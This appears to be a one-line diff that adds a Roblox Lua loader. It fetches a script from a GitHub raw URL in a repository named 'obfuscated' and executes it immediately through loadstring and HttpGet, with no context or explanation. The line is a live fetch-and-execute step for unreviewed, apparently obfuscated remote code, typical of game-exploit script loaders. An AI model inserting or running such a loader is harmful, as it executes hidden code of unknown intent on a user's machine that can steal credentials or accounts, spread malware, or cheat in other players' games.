@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://github.com/SxripterRar/obfuscated/blob/main/probably%20not%20ssp?raw=true'))()
